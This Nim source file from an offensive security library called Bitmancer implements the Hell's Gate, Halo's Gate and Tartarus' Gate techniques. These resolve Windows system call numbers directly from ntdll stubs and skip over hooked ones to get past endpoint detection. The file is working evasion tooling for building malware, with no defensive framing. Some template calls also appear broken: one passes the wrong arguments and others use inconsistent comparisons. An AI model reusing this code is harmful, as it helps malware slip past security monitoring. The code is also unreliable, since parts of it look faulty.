##---------------------------------------------------------------------
##      Bitmancer - a library for Offensive Security Development 
##           
##          Copyright (C) 2022  B. Marshall (zimawhite1@gmail.com)
##
##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.
##
##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.
##
##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <https://www.gnu.org/licenses/>.
## 
##----------------------------------------------------------------------------------
import
    base

export
    base

## SSN "gate" retrieval implementations (with some small differences)
##------------------------------------------------------------------------

## Hell's Gate 
##------------------------------------
func hellsGateParse(pFunction: PVOID): SyscallResult =
    var index = WORD(0)
    while true:
        ## check if syscall, in this case we are too far
        if cast[PBYTE](pFunction +! index)[] == 0x0F and cast[PBYTE](pFunction +! (index+1))[] == 0x05:
            return err SyscallNotFound
        ## check if ret, in this case we are also probaly too far
        if cast[PBYTE](pFunction +! index)[] == 0xC3:
            return err SyscallNotFound
        ## check for SSN
        if (result = checkStub(pFunction, DWORD(index)); result.isOk()):
            return
        inc index

proc hellsGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    hellsGateParse(pFunc)

proc hellsGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    hellsGateParse(pFunc)

template hellsGate*(imageBase, importBase: ModuleHandle, ident: SomeProcIdent, symEnum: static SymbolEnumeration): SyscallResult =
    when symEnum == UseEAT: hellsGateEat(imageBase, ident)
    elif symEnum == UseIAT: hellsGateIat(imageBase, ident)

## Halo's Gate 
##------------------------------------
func halosGateParse(pFunction: PVOID): SyscallResult =
    ## check for SSN
    if (result = checkStub(pFunction, 0); result.isOk()):
        return
    ## if hooked, check the neighborhood to find clean syscall
    if cast[PBYTE](pFunction)[] == 0xE9:
        for i in 0 ..< 500:
            ## check neighboring syscall down
            if (result = checkStub(pFunction, DWORD(i * StubOffsetDown)); result.isOk()):
                return
            ## check neighboring syscall up
            if (result = checkStub(pFunction, DWORD(i * StubOffsetUp)); result.isOk()):
                return

proc halosGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    halosGateParse(pFunc)

proc halosGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    halosGateParse(pFunc)

template halosGate*(imageBase, importBase: ModuleHandle, ident: SomeProcIdent, symEnum: static SymbolEnumeration): SyscallResult =
    when symEnum is UseEAT: halosGateEat(imageBase, ident)
    elif symEnum is UseIAT: halosGateIat(imageBase, ident)

## Tartarus' Gate 
##------------------------------------
func tartarusGateParse(pFunction: PVOID): SyscallResult =
    if (result = halosGateParse(pFunction); result.isOk()):
        return
    ## if hooked after `mov r10, rcx`, check the neighborhood to find clean syscall
    if cast[PBYTE](pFunction +! 3)[] == 0xE9:
        for i in 0 ..< 500:
            ## check neighboring syscall down
            if (result = checkStub(pFunction, DWORD(i * StubOffsetDown)); result.isOk()):
                return
            ## check neighboring syscall up
            if (result = checkStub(pFunction, DWORD(i * StubOffsetUp)); result.isOk()):
                return

proc tartarusGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    tartarusGateParse(pFunc)

proc tartarusGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    tartarusGateParse(pFunc)

template tartarusGate*(imageBase, importBase: ModuleHandle, ident: SomeProcIdent, symEnum: static SymbolEnumeration): SyscallResult =
    when symEnum is UseEAT: tartarusGateEat(imageBase, ident)
    elif symEnum is UseIAT: tartarusGateIat(imageBase, ident)

